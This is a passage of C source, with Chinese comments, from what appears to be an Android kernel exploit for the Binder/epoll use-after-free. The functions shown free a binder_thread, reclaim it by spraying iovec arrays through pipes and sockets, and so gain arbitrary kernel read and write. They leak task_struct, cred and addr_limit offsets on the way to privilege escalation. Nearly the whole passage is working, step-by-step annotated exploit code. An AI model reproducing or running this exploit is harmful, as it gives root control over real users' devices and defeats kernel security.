	/* 此管道做父子进程通信，读取泄露的内容 */
	if (pipe(leakpipe)){
		error("[ERROR] %s %d : pipe leakpipe failed!", __FUNCTION__, __LINE__);
		goto err_ltc_leakpipe;
	}
	/* 设置管道大小为一个页 */
	if ((fcntl(pipefd[0], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);
	if ((fcntl(pipefd[1], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);

	pid_t fork_ret = fork();
	if (fork_ret == -1){
		error("[ERROR] %s %d : fcntl F_SETPIPE_SZ failed!", __FUNCTION__, __LINE__);
		goto err_ltc_fork;
	}
	if (fork_ret == 0) {
        /* Child process */
		int offset = 0;
		unsigned long kdat = 0;
		unsigned long list_next = 0;
		unsigned long list_prev = 0;
		struct leak_data leak = {0,};
        unsigned long leaksize = pad_size + UAF_SPINLOCK + leak_min_size;
		unsigned char* leakbuf = malloc(leaksize);

		if(!leakbuf){
			error("[ERROR] %s %d : malloc write_buf failed!", __FUNCTION__, __LINE__);
		}
		memset(leakbuf, 0, leaksize);

		if(prctl(PR_SET_PDEATHSIG, SIGKILL)){
			error("ERROR] %s %d : prctl PR_SET_PDEATHSIG failed!", __FUNCTION__, __LINE__);
		}
		/* 等待父进程阻塞后调度 */
		usleep(DELAY_USEC);
		/* 4、第一次触发漏洞，会进行链表删除操作 */
		if(epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event)){
			error("ERROR] %s %d : epoll_ctl EPOLL_CTL_DEL failed!", __FUNCTION__, __LINE__);
		}

		/* 第一次读取，四组数据，第四组数据没有读完 */
        if (read(pipefd[0], leakbuf, leaksize) != leaksize){
			error("ERROR] %s %d : read leakbuf failed!", __FUNCTION__, __LINE__);
    	}
        //hexdump_memory(leakbuf + leaksize - leak_min_size, leak_min_size);

		/* 泄露的next和prev指针必须相等 */
		list_next = *(unsigned long *)(leakbuf + leaksize - leak_min_size);
		list_prev = *(unsigned long *)(leakbuf + leaksize - leak_min_size + sizeof(void*));
		/* 从泄露的内核数据中获取task指针 */
		leak.task = *(unsigned long *)((leakbuf + leaksize - leak_min_size) + dev_info->offset_binder_next_task);
		//printf(">>> CHILD: list_next = 0x%lx; list_prev = 0x%lx\n", list_next, list_prev);
		//printf(">>> CHILD: task_struct = 0x%lx\n", leak.task);

		if((leak.task > KERNEL_ADDR_START) && (list_next == list_prev) && list_next > KERNEL_ADDR_START){
			unsigned long extra[] = {
				list_next,
				leak_adj_size,
				/* 需要泄露的内核地址，这里是需要泄露的task地址 */
				leak.task,
				/* 需要泄露的数据的长度，这里固定一个页 */
				lksec_size
			};
			struct clobber_gdata gdata[] = {
				{
					/* 要修改的地址，这里就是iovec_array[indx_wait + 3].iov_base对应的内核地址 */
					.dst = list_next,
					/* 写入数据的地址 */
					.src = (void*)&extra,
					/* 写入数据的长度 */
					.len = sizeof(extra),
				},
			};
			/* 调用任意写函数，成功修改返回1 */
			ret = clobber_group_data_corrlen(binder_fd, epfd, gdata, ARRAY_SIZE(gdata));
			if (!ret) {
				error("ERROR] %s %d : clobber_group_data_corrlen failed!", __FUNCTION__, __LINE__);
            }
        }

		/* 第二次读取，继续读取第四组剩余数据，大小0x1000 */
        if (read(pipefd[0], leakbuf, leak_adj_size - leak_min_size) != leak_adj_size - leak_min_size){
			error("ERROR] %s %d : read leakbuf failed!", __FUNCTION__, __LINE__);
        }

		/* 第三次读取，读取第五组数据，大小lksec_size */
		if (read(pipefd[0], leakbuf, lksec_size) != lksec_size) {
			error("ERROR] %s %d : read leakbuf failed!", __FUNCTION__, __LINE__);
		}
        //hexdump_memory(leakbuf, lksec_size);

		if(ret){
			if(dev_info->offset_task_stack){
				leak.stack = *(unsigned long*)(leakbuf + dev_info->offset_task_stack);
			}
			/* 如果内核栈偏移不正确，在task中找第一个内核地址的值认为是内核栈地址 */
			if(leak.stack < KERNEL_ADDR_START){
				for(int i = 0; i < 10; i++){
					kdat = *(unsigned long*)(leakbuf + i*sizeof(void*));
					if(kdat > KERNEL_ADDR_START){
						leak.stack = kdat;
						dev_info->offset_task_stack = i*sizeof(void*);
						printf(">>> stack offset = 0x%x\n", dev_info->offset_task_stack);
						break;
					}
				}
			}
			/* 查找task结构体的前10个值，判断是否有USER_DS，如果有说明thread_info内嵌在task结构体 */
			for(int i = 0; i < 10; i++){
				kdat = *(unsigned long*)(leakbuf + i*sizeof(void*));
				if(kdat == USER_DS){
					leak.thread = leak.task;
					dev_info->offset_addr_limit = i*sizeof(void*);
					//printf(">>> thread_info in task_struct, addr_limit = 0x%lx; offset = 0x%x\n", kdat, dev_info->offset_addr_limit);
					break;
				}
			}
			/* 前面没有找到addr_limit，那么 thread_info 等于内核栈地址 */
			if(leak.thread < KERNEL_ADDR_START){
				leak.thread = leak.stack;
			}
			/* 如果参数中指定cred偏移，则直接读取cred指针 */
			if(dev_info->offset_task_cred){
				leak.cred = *(unsigned long*)(leakbuf + dev_info->offset_task_cred);
			}
			else{
				offset = get_cred_offset((void*)leakbuf, ONE_PAGE_SIZE);
				if(-1 != offset){
					leak.cred = *(unsigned long*)(leakbuf + offset);
					dev_info->offset_task_cred = offset;
					printf(">>> cred offset = 0x%x\n", offset);
				}
				else{
					printf(">>> get cred offset failed!\n");
				}
			}
			/* 如果参数中指定sched_class偏移，则直接读取sched_class指针 */
			if(dev_info->offset_task_sched_class){
				leak.kaddr = *(unsigned long*)(leakbuf + dev_info->offset_task_sched_class);
			}
			else{
				offset = get_sched_class_offset((void*)leakbuf, ONE_PAGE_SIZE);
				if(offset){
					leak.kaddr = *(unsigned long*)(leakbuf + offset);
					dev_info->offset_task_sched_class = offset;
					printf(">>> sched_class offset = 0x%x\n", offset);
				}
				else{
					printf(">>> get sched_class offset failed!\n");
				}
			}
			//printf(">>> CHILD: thread_info = 0x%lx\n", leak.thread);
			//printf(">>> CHILD: cred = 0x%lx\n", leak.cred);
			//printf(">>> CHILD: kaddr = 0x%lx\n", leak.kaddr);
			status = 1;
		}

		/* 通过管道将泄露的数据传递给父进程 */
		if(write(leakpipe[1], &leak, sizeof(leak)) != sizeof(leak)){
			error("ERROR] %s %d : write leak data failed!", __FUNCTION__, __LINE__);
		}
		/* 通知父进程泄露内核数据的状态 */
		if(write(leakpipe[1], &status, sizeof(status)) != sizeof(status)){
			error("ERROR] %s %d : write status failed!", __FUNCTION__, __LINE__);
		}

		close(pipefd[0]);
		close(pipefd[1]);
		close(leakpipe[0]);
		close(leakpipe[1]);
		free(leakbuf);

		exit(0);
    }
	/* Parent process */
	/* 2、释放 binder_thread 结构体 */
	if(ioctl(binder_fd, BINDER_THREAD_EXIT, NULL)){
		error("[ERROR] %s %d : ioctl binder_fd BINDER_THREAD_EXIT failed!", __FUNCTION__, __LINE__);
	}
	/* 3、堆喷，抢占刚被释放 binder_thread 所占的内存 */
	ret = writev(pipefd[1], iovec_array, iovec_array_count);
	if(ret != total_len){
		error("[ERROR] %s %d : writev failed!", __FUNCTION__, __LINE__);
	}
	/* 从子进程读取泄露的内核信息 */
	ret = read(leakpipe[0], lkdat, sizeof(struct leak_data));
	if(ret != sizeof(struct leak_data)){
		error("[ERROR] %s %d : read leak data failed!", __FUNCTION__, __LINE__);
	}
	/* 读取子进程泄露内核信息状态 */
	ret = read(leakpipe[0], &status, sizeof(status));
	if(ret != sizeof(status)){
		error("[ERROR] %s %d : read success failed!", __FUNCTION__, __LINE__);
	}

	/* 等待子进程结束 */
	if (wait(&ret) != fork_ret)
		error("[ERROR] %s %d : wait child failed!", __FUNCTION__, __LINE__);

err_ltc_fork:
	close(leakpipe[0]);
	close(leakpipe[1]);
err_ltc_leakpipe:
	close(pipefd[0]);
	close(pipefd[1]);
err_ltc_pipe:
	free(dummy_buf);
err_ltc_dummy_buf:
	free(iovec_array);
err_ltc_iovec_array:
	return status;
}
#endif

#if 1
/*
 * 函数: clobber_group_data_corrbase
 * 参数: gdata, 指向利用漏洞修改数据的信息; count, 共有多少组信息;
 * 返回: 成功返回真，失败返回假
 * 说明: 利用漏洞实现向任意地址写任意数据，可同时修改多组数据
 *       binder_thread.wait 字段对应 iovec.base 的情况
 */
int clobber_group_data_corrbase(int binder_fd, int epfd, struct clobber_gdata* gdata, int count)
{
	int i, j;
	int result;
	int socks[2];
	pid_t fork_ret;
	int total_len = 0;
	int write_len = 0;
	/* 漏洞触发成功 test_dat == test_val */
    unsigned long test_dat = 0;
    unsigned long const test_val = 0xABCDDEADBEEF1234ul;
	struct epoll_event event = { .events = EPOLLIN };

#if 0 /* 注释说明，假设修改一组数据 */
	/* 构造的数组内容，在漏洞触发后会覆盖iovec数组中字段，对应关系如下 */
	unsigned long second_write_chunk[] = {
		1,                           // iovec_array[indx_wait].iov_len
		0xdeadbeef,                  // iovec_array[indx_wait + 1].iov_base
		(5+2)*8,                     // iovec_array[indx_wait + 1].iov_len
		gdata->dst,                  // iovec_array[indx_wait + 2].iov_base
		gdata->len,                  // iovec_array[indx_wait + 2].iov_len
		(unsigned long)&test_dat,    // iovec_array[indx_wait + 3].iov_base
		sizeof(test_dat),            // iovec_array[indx_wait + 3].iov_len
	};
#endif
	/* 构造的一组数组，在漏洞触发后会覆盖iovec数组中字段 */
	int second_write_size = (5+count*2)*sizeof(unsigned long);
	unsigned long *second_write_chunk = malloc(second_write_size);
	if(!second_write_chunk){
		error("[ERROR] %s %d : malloc second_write_chunk failed!", __FUNCTION__, __LINE__);
		goto err_cgd_write_chunk;
	}
	second_write_chunk[0] = 1;
	second_write_chunk[1] = 0xdeadbeef;
	second_write_chunk[2] = second_write_size;
	for(i = 3, j = 0; j < count; j++){
		second_write_chunk[i++] = gdata[j].dst;
		second_write_chunk[i++] = gdata[j].len;
	}
	second_write_chunk[i++] = (unsigned long)&test_dat;
	second_write_chunk[i] = sizeof(test_dat);

	/* 占位binder_thread结构体后，wait字段在iovec_array数组中的数组项 */
	int indx_wait = dev_info->offset_binder_wait/sizeof(struct iovec);
	/* iovec_array数组元素的个数 */
	int iovec_array_count = dev_info->offset_binder_task/sizeof(struct iovec);
	/* iovec_array数组的大小，因为占位binder_thread结构体后需要泄露task指针，
	 * 因此不能覆盖task指针，所以这里不是用binder_thread结构体的大小 */
	int iovec_array_size = iovec_array_count*sizeof(struct iovec);
	struct iovec* iovec_array = malloc(iovec_array_size);

	if(!iovec_array){
		error("[ERROR] %s %d : malloc iovec_array failed!", __FUNCTION__, __LINE__);
		goto err_cgd_iovec_array;
	}
	memset(iovec_array, 0, iovec_array_size);
	/* 初始化 iovec_array 数组数据
	 * 第一组数据，填充触发漏洞时自旋锁操作后地址出现一个字节的情况
	 * 第二组数据，作用是触发漏洞后将second_write_chunk内容填充到iovec_array[indx_wait].iov_len对应的内核位置
	 * 第三-最后第二组数据，作用是写入指定内容到指定地址
	 * 最后一组数据，用于测试是否成功 */
	iovec_array[indx_wait].iov_base = mmap_addr;     /* wq->lock spinlock in the low address half must be zero */
	iovec_array[indx_wait].iov_len = 1;              /* wq->task_list->next */
	iovec_array[indx_wait + 1].iov_base = mmap_addr; /* wq->task_list->prev */
	iovec_array[indx_wait + 1].iov_len = second_write_size; /* 该值为second_write_chunk大小 */
	for(i = 2, j = 0; j < count; i++, j++){
		iovec_array[indx_wait + i].iov_base = mmap_addr;
		iovec_array[indx_wait + i].iov_len = gdata[j].len;
	}
	iovec_array[indx_wait + i].iov_base = mmap_addr;
	iovec_array[indx_wait + i].iov_len = sizeof(test_dat);
	total_len = iovec_size(iovec_array, iovec_array_count);
	write_len = total_len - 1;
	//printf(">>> total_len = 0x%x\n", total_len);

	/* 1、创建 binder_thread 结构体，epfd 与binder_fd 建立联系 */
	if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)){
		error("[ERROR] %s %d : epoll_ctl EPOLL_CTL_ADD failed!", __FUNCTION__, __LINE__);
		goto err_cgd_epoll_ctl;
	}

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks))
		error("[ERROR] %s %d : socketpair SOCK_STREAM failed!", __FUNCTION__, __LINE__);
	/* 触发漏洞前先写入一个字节，绕过第一组数据，防止触发漏洞后iovec_array[indx_wait].iov_len
	 * 被改为内核地址，长度不确定 */
	if (write(socks[1], "X", 1) != 1)
		error("[ERROR] %s %d : write socket 1 byte failed!", __FUNCTION__, __LINE__);

	/* 创建子进程 */
	fork_ret = fork();
	if (fork_ret == -1){
		error("[ERROR] %s %d : fork child failed!", __FUNCTION__, __LINE__);
		goto err_cgd_fork;
	}
	else if (fork_ret == 0){
		/* Child process */
		int pos = 0;
        char *write_buf = malloc(write_len);
		if(!write_buf)
			error("[ERROR] %s %d : malloc write_buf failed!", __FUNCTION__, __LINE__);
		memset(write_buf, 0, write_len);

		prctl(PR_SET_PDEATHSIG, SIGKILL);
		/* 等待父进程阻塞后调度到子进程执行 */
		usleep(DELAY_USEC);
		/* 4、第一次触发漏洞，会进行链表删除操作 */
		if(epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event)){
			error("[ERROR] %s %d : epoll_ctl EPOLL_CTL_DEL failed!", __FUNCTION__, __LINE__);
		}

		/* 准备写入的数据 */
        memcpy(write_buf, second_write_chunk, second_write_size);
		pos += second_write_size;
		for(i = 0; i < count; i++){
        	memcpy(write_buf + pos, gdata[i].src, gdata[i].len);
			pos += gdata[i].len;
		}
        memcpy(write_buf + pos, &test_val, sizeof(test_val));
		
		/* 5、写入数据，必须保证写端和读端的数据长度一致 */
		if (write(socks[1], write_buf, write_len) != write_len){
			error("[ERROR] %s %d : write write_buf failed!", __FUNCTION__, __LINE__);
		}

		free(write_buf);
		close(socks[0]);
		close(socks[1]);
		exit(0);
	}
	/* 2、释放 binder_thread 结构体 */
	if(ioctl(binder_fd, BINDER_THREAD_EXIT, NULL)){
		error("[ERROR] %s %d : ioctl BINDER_THREAD_EXIT failed!", __FUNCTION__, __LINE__);
	}
	struct msghdr msg = {
		.msg_iov = iovec_array,
		.msg_iovlen = iovec_array_count
	};
	/* 3、堆喷，抢占刚被释放 binder_thread 所占的内存，这里进行堆喷很容易成功，是因为slub的实现机制，
	 *    请仔细阅读slub相关代码，对理解堆喷有帮助
	 *    因为之前已经写入一个字节数据，所以这里会将第一组数据读取，之后阻塞住等待写入（这一点很重要）
	 *    这里没有使用管道是因为管道读完第一组数据后没办法阻塞
	 * 6、触发漏洞之后读端数据会发生变化
	 *    iovec_array[indx_wait].iov_base = mmap_addr;
	 *    iovec_array[indx_wait].iov_len = kp_next; //就是iovec_array[indx_wait].iov_len对应的内核地址
	 *    // 因为第一组数据已经读取，可以绕过，从第二组数据开始读取
	 *    iovec_array[indx_wait + 1].iov_base = kp_next;
	 *    iovec_array[indx_wait + 1].iov_len = (5+count*2)*sizeof(void*);
	 *    for(i = 2, j = 0; j < count; i++, j++){
	 *        iovec_array[indx_wait + i].iov_base = mmap_addr;
	 *        iovec_array[indx_wait + i].iov_len = gdata[j].len;
	 *    }
	 *    iovec_array[indx_wait + i].iov_base = mmap_addr;
	 *    iovec_array[indx_wait + i].iov_len = sizeof(test_dat);
	 *
	 *    读取第二组数据，将写入的second_write_chunk数据内容写到iovec_array[indx_wait].iov_len对应的内核地址
	 *    之后读端数据又发生了变化
	 *    for(i = 2, j = 0; j < count; i++, j++){
	 *        iovec_array[indx_wait + i].iov_base = gdata[j].dst;
	 *        iovec_array[indx_wait + i].iov_len = gdata[j].len;
	 *    }
	 *    iovec_array[indx_wait + i].iov_base = test_dat;
	 *    iovec_array[indx_wait + i].iov_len = sizeof(test_dat);
	 *    
	 *    读取第三-最后第二组数据，就会将写入的gdata[i].src数据（任意数值），读取到gdata[j].dst（任意地址），
	 *    达到了向任意内核地址写任意值
	 *
	 *    读取最后一组数据，将写入的test_val的值读取到test_dat中 */
	result = recvmsg(socks[0], &msg, MSG_WAITALL);
	if(result != total_len){
		error("[ERROR] %s %d : recvmsg failed! result = 0x%x, total_len = 0x%x",  __FUNCTION__, __LINE__, result, total_len);
	}

err_cgd_fork:
	close(socks[0]);
	close(socks[1]);
err_cgd_epoll_ctl:
	free(iovec_array);
err_cgd_iovec_array:
	free(second_write_chunk);
err_cgd_write_chunk:
	return test_dat == test_val;
}

/*
 * 函数: leak_data_corrbase
 * 参数: gdata, 存放泄露数据的信息
 * 返回: 成功返回1，失败返回0
 * 说明: 利用漏洞泄露内核数据
 *       binder_thread.wait 字段对应 iovec.base 的情况
 */
int leak_data_corrbase(int binder_fd, int epfd, struct leak_gdata* gdata)
{
	int ret = 0;	
	int status = 0;
	int pipefd[2];
	int leakpipe[2];
    int max_threads = 2;
	pid_t fork_ret;
	int offset = 0;
	struct epoll_event event = { .events = EPOLLIN };
	/* 占位binder_thread结构体后，wait字段在iovec_array数组中的数组项 */
	int indx_wait = dev_info->offset_binder_wait/sizeof(struct iovec);
	/* iovec_array数组的个数 */
	int iovec_array_count = dev_info->offset_binder_task/sizeof(struct iovec);
	/* iovec_array数组的大小，因为占位binder_thread结构体后需要泄露task指针，
	 * 因此不能覆盖task指针，所以这里不是用binder_thread结构体的大小 */
	int iovec_array_size = iovec_array_count*sizeof(struct iovec);
	struct iovec* iovec_array = malloc(iovec_array_size);

	if(!iovec_array){
		error("[ERROR] %s %d : malloc iovec_array failed!", __FUNCTION__, __LINE__);
		goto err_lgd_iovec_array;
	}
	memset(iovec_array, 0, iovec_array_size);
	/* 这里初始化四组数据
	 * 第一组数据，作用是阻塞管道;
	 * 第二组数据，作用是触发漏洞之后泄露内核数据;
	 * 第三组数据，作用是阻塞管道;
	 * 第四组数据，作用是在修改地址后，再次泄露内核数据 */
	iovec_array[indx_wait].iov_base = mmap_addr;     /* wq->lock spinlock in the low address half must be zero */
	iovec_array[indx_wait].iov_len = ONE_PAGE_SIZE;  /* wq->task_list->next */
	iovec_array[indx_wait + 1].iov_base = mmap_addr; /* wq->task_list->prev */
	iovec_array[indx_wait + 1].iov_len = ONE_PAGE_SIZE;
	iovec_array[indx_wait + 2].iov_base = mmap_addr;
	iovec_array[indx_wait + 2].iov_len = ONE_PAGE_SIZE;
	iovec_array[indx_wait + 3].iov_base = mmap_addr; /* 此地址后续会被修改为泄露内核数据的地址 */
	iovec_array[indx_wait + 3].iov_len = gdata->len;//ONE_PAGE_SIZE;

	/* 计算需要修改第二次泄露内核信息的读取地址与next指针的偏移 */
	offset = (unsigned long)&(iovec_array[indx_wait + 3].iov_base) - (unsigned long)&(iovec_array[indx_wait].iov_len);
	//printf("    offset = 0x%x\n", offset);

	/* 设置binder最多可以请求注册线程个数 */
    if(ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads)){
		error("[ERROR] %s %d : ioctl binder_fd BINDER_SET_MAX_THREADS failed!", __FUNCTION__, __LINE__);
	}
	/* 1、创建 binder_thread 结构体，epfd 与 binder_fd 建立联系 */
	if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)){
		error("[ERROR] %s %d : epoll_ctl EPOLL_CTL_ADD failed!", __FUNCTION__, __LINE__);
		goto err_lgd_ctl_add;
	}

	/* 此管道用来堆喷占位、泄露task内容 */
	if (pipe(pipefd))
		error("[ERROR] %s %d : pipe fd failed!", __FUNCTION__, __LINE__);
	/* 此管道做父子进程通信，读取泄露的内容 */
    if (pipe(leakpipe))
        error("[ERROR] %s %d : pipe leak fd failed!", __FUNCTION__, __LINE__);
	/* 设置管道大小为一个页 */
	if ((fcntl(pipefd[0], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl pipefd[0] size failed!", __FUNCTION__, __LINE__);
	if ((fcntl(pipefd[1], F_SETPIPE_SZ, ONE_PAGE_SIZE)) != ONE_PAGE_SIZE)
		error("[ERROR] %s %d : fcntl pipefd[1] size failed!", __FUNCTION__, __LINE__);

	fork_ret = fork();
	if (fork_ret == -1){
		error("%s %d : fork child failed!", __FUNCTION__, __LINE__);
		goto err_lgd_fork;
	}
	else if (fork_ret == 0){
		/* Child process */
		unsigned long list_next = 0;
		unsigned long list_prev = 0;
		void* page_buffer = malloc(gdata->len);

		memset(page_buffer, 0, sizeof(page_buffer));

		if(prctl(PR_SET_PDEATHSIG, SIGKILL)){
			error("[ERROR] %s %d : CHILD: prctl PR_SET_PDEATHSIG failed!", __FUNCTION__, __LINE__);
		}
		usleep(DELAY_USEC);
		/* 4、第一次触发漏洞，会进行链表删除操作 */
		if(epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event)){
			error("[ERROR] %s %d : CHILD: epoll_ctl EPOLL_CTL_DEL failed!", __FUNCTION__, __LINE__);
		}
		/* 5、读取第一组数据，数据内容是mmap_addr中第一页数据，无用数据
		 *    这里会将管道缓冲区读空，会唤醒父进程可以往管道写数据了 */
		if (read(pipefd[0], page_buffer, ONE_PAGE_SIZE) != ONE_PAGE_SIZE){
			error("[ERROR] %s %d : CHILD: read pipefd[0] first page failed!", __FUNCTION__, __LINE__);
		}
		/* 7、读取第二组数据，由于管道被读空会被阻塞，等待父进程将第二组数据写入管道
		 *    当父进程写完第二组的一页数据后继续阻塞，子进程被唤醒继续读取第二组数据
		 *    数据的内容是iovec_array[indx_wait].iov_len对应的内核地址k_next往后的一页数据，
		 *    从而泄露内核数据，其中包括进程的task_struct指针 */
		if (read(pipefd[0], page_buffer, ONE_PAGE_SIZE) != ONE_PAGE_SIZE){
			error("[ERROR] %s %d : CHILD: read pipefd[0] second page failed!", __FUNCTION__, __LINE__);
		}
		//hexdump_memory((unsigned char *)page_buffer, 0x100);//sizeof(page_buffer));

		/* 泄露的next和prev指针必须相等 */
		list_next = *(unsigned long *)(page_buffer);
		list_prev = *(unsigned long *)((unsigned char *)page_buffer + sizeof(void*));
		//printf(">>> CHILD: list_next = 0x%lx; list_prev = 0x%lx\n", list_next, list_prev);

		ret = 0;
		/* 9、修改   iovec_array[indx_wait + 3].iov_base = gdata->dst
		 *    等待父进程写第四组数据时将gdata->dst内容写入管道中，之后子进程再读取管道数据
		 *    从而泄露gdata->dst内容 */
		if((list_next > KERNEL_ADDR_START) && (list_next == list_prev)){
			unsigned long extra[] = {
				gdata->dst,
				gdata->len
			};
			struct clobber_gdata cdata[] = {
				{
					.dst = list_next + offset,
					.src = (void*)&extra,
					.len = sizeof(extra),
				},
			};
			ret = clobber_group_data_corrbase(binder_fd, epfd, cdata, ARRAY_SIZE(cdata));
		}

		/* 10、读取第三组数据，无用数据，之后唤醒父进程继续写管道 */
		if (read(pipefd[0], page_buffer, ONE_PAGE_SIZE) != ONE_PAGE_SIZE){
			error("[ERROR] %s %d : CHILD: read pipefd[0] third page failed!", __FUNCTION__, __LINE__);
		}
		/* 12、读取第四组数据，数据内容是gdata->dst地址中的数据 */
		if (read(pipefd[0], page_buffer, gdata->len) != gdata->len){
			error("[ERROR] %s %d : CHILD: read pipefd[0] thread_info failed!", __FUNCTION__, __LINE__);
		}
		if(ret){
			//hexdump_memory((unsigned char *)page_buffer, gdata->len/*ONE_PAGE_SIZE*/);
			status = 1;
		}
		else{
			status = 0;
		}

		/* 通过管道将泄露的数据传递给父进程 */
		if(write(leakpipe[1], page_buffer, gdata->len) != gdata->len)
			error("[ERROR] %s %d : CHILD: write leakpipe[1] failed!", __FUNCTION__, __LINE__);

		/* 通知父进程泄露信息状态 */
		if(write(leakpipe[1], &status, sizeof(status)) != sizeof(status))
			error("[ERROR] %s %d : CHILD: write leakpipe[1] failed!", __FUNCTION__, __LINE__);

        close(pipefd[0]);
        close(pipefd[1]);
        close(leakpipe[0]);
        close(leakpipe[1]);
		free(page_buffer);
		exit(0);
	}
	/* Parent process */
	/* 2、释放 binder_thread 结构体 */
	if(ioctl(binder_fd, BINDER_THREAD_EXIT, NULL)){
		error("[ERROR] %s %d : PARENT: ioctl binder_fd BINDER_THREAD_EXIT failed!", __FUNCTION__, __LINE__);
	}
	/* 3、堆喷，抢占刚被释放 binder_thread 所占的内存
	 *    写第一组数据，由于管道大小被修改为一个页面，所以会阻塞等待读取数据
	 *    总共四组数据，都是一个页大小，所以每写一组数据都会阻塞，等待读数据
	 * 6、子进程运行后触发漏洞，并读取第一组数据，此时管道为空可以继续往管道写数据
	 *    此时的iovec_array数据变化如下
	 *    iovec_array[indx_wait].iov_base = 0x100010001;
	 *    iovec_array[indx_wait].iov_len = k_next;//next指针对应的内核地址
	 *    // 第一组数据已经写入管道，所以没有影响
	 *    // 第二组数据的iov_base变成iovec_array[indx_wait].iov_len对应的内核地址k_next
	 *    // 此次写管道就会将k_next往后的一页数据写入管道，之后由于管道没有空间而阻塞，等待子进程读取数据
	 *    iovec_array[indx_wait + 1].iov_base = k_next;
	 *    iovec_array[indx_wait + 1].iov_len = 0x1000;
	 *    iovec_array[indx_wait + 2].iov_base = 0x100000000;
	 *    iovec_array[indx_wait + 2].iov_len = 0x1000;
	 *    iovec_array[indx_wait + 3].iov_base = 0x100000000;
	 *    iovec_array[indx_wait + 3].iov_len = 0x1000;
	 * 8、子进程读取第二组数据后，管道为空，唤醒父进程继续写第三组数据，之后再次阻塞等待子进程读取数据
	 * 11、子进程读取第三组数据之后将修改iovec_array[indx_wait + 3].iov_base = gdata->dst
	 *    此时的iovec_array数据变化如下，此时继续写管道会将gdata->dst内容写入管道
	 *    iovec_array[indx_wait + 3].iov_base = gdata->dst;
	 *    iovec_array[indx_wait + 3].iov_len = gdata->len; */
	ret = writev(pipefd[1], iovec_array, iovec_array_count);
	if(ret == -1){
		error("[ERROR] %s %d : PARENT: writev failed!", __FUNCTION__, __LINE__);
	}

	/* 从子进程读取泄露的内核信息 */
    ret = read(leakpipe[0], gdata->src, gdata->len);
	if(ret != gdata->len){
		error("[ERROR] %s %d : PARENT: read gdata->src failed!", __FUNCTION__, __LINE__);
	}

	/* 等待子进程退出 */
	if (wait(&status) != fork_ret)
		error("%s %d : PARENT: wait child failed", __FUNCTION__, __LINE__);

	/* 读取子进程发送状态 */
    ret = read(leakpipe[0], &status, sizeof(status));
	if(ret != sizeof(status)){
		error("[ERROR] %s %d : PARENT: read status failed!", __FUNCTION__, __LINE__);
	}

err_lgd_fork:
	close(pipefd[0]);
	close(pipefd[1]);
	close(leakpipe[0]);
	close(leakpipe[1]);
err_lgd_ctl_add:
	free(iovec_array);
err_lgd_iovec_array:
	return status;
}

/*
 * 函数: leak_task_corrbase
 * 参数: dat, 存放泄露的内核数据
 * 返回: 成功返回1，失败返回0
 * 说明: 利用漏洞泄露task内容
 *       binder_thread.wait 字段对应 iovec.base 的情况
 */
int leak_task_corrbase(int binder_fd, int epfd, struct leak_data* dat)
{
	int ret = 0;	
	int status = 0;
	int pipefd[2];
	int leakpipe[2];
    int max_threads = 2;
	pid_t fork_ret;
	int offset = 0;
	struct epoll_event event = { .events = EPOLLIN };
	/* 占位binder_thread结构体后，wait字段在iovec_array数组中的数组项 */
	int indx_wait = dev_info->offset_binder_wait/sizeof(struct iovec);
	/* iovec_array数组的个数 */
	int iovec_array_count = dev_info->offset_binder_task/sizeof(struct iovec);
	/* iovec_array数组的大小，因为占位binder_thread结构体后需要泄露task指针，
	 * 因此不能覆盖task指针，所以这里不是用binder_thread结构体的大小 */
	int iovec_array_size = iovec_array_count*sizeof(struct iovec);
	struct iovec* iovec_array = malloc(iovec_array_size);

	if(!iovec_array){
		error("[ERROR] %s %d : malloc iovec_array failed!", __FUNCTION__, __LINE__);
		goto err_lt_iovec_array;
	}
	memset(iovec_array, 0, iovec_array_size);
	/*
	 * 这里初始化四组数据
	 * 第一组数据，作用是阻塞管道;
	 * 第二组数据，作用是触发漏洞之后泄露内核数据;
	 * 第三组数据，作用是阻塞管道;
	 * 第四组数据，作用是在修改地址后，再次泄露内核数据
	 */
	iovec_array[indx_wait].iov_base = mmap_addr;     /* wq->lock spinlock in the low address half must be zero */
	iovec_array[indx_wait].iov_len = ONE_PAGE_SIZE;  /* wq->task_list->next */
	iovec_array[indx_wait + 1].iov_base = mmap_addr; /* wq->task_list->prev */
	iovec_array[indx_wait + 1].iov_len = ONE_PAGE_SIZE;
	iovec_array[indx_wait + 2].iov_base = mmap_addr;
	iovec_array[indx_wait + 2].iov_len = ONE_PAGE_SIZE;
	iovec_array[indx_wait + 3].iov_base = mmap_addr; /* 此地址后续会被修改为泄露内核数据的地址 */
	iovec_array[indx_wait + 3].iov_len = ONE_PAGE_SIZE;

	/* 计算需要修改第二次泄露内核信息的读取地址与next指针的偏移 */
	offset = (unsigned long)&(iovec_array[indx_wait + 3].iov_base) - (unsigned long)&(iovec_array[indx_wait].iov_len);
	//printf("    offset = 0x%x\n", offset);

	/* 设置binder最多可以请求注册线程个数 */
	if(ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads)){
		error("[ERROR] %s %d : ioctl binder_fd BINDER_SET_MAX_THREADS failed!", __FUNCTION__, __LINE__);
	}
	/* 1、创建 binder_thread 结构体，epfd 与 binder_fd 建立联系 */
	if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)){
		error("[ERROR] %s %d : epoll_ctl EPOLL_CTL_ADD failed!", __FUNCTION__, __LINE__);
		goto err_lt_ctl_add;
	}

	/* 此管道用来堆喷占位、泄露task内容 */
	if (pipe(pipefd))
		error("[ERROR] %s %d : pipe fd failed!", __FUNCTION__, __LINE__);
	/* 此管道做父子进程通信，读取泄露的内容 */
    if (pipe(leakpipe))
        error("[ERROR] %s %d : pipe leak fd failed!", __FUNCTION__, __LINE__);
	/* 设置管道大小为一个页 */
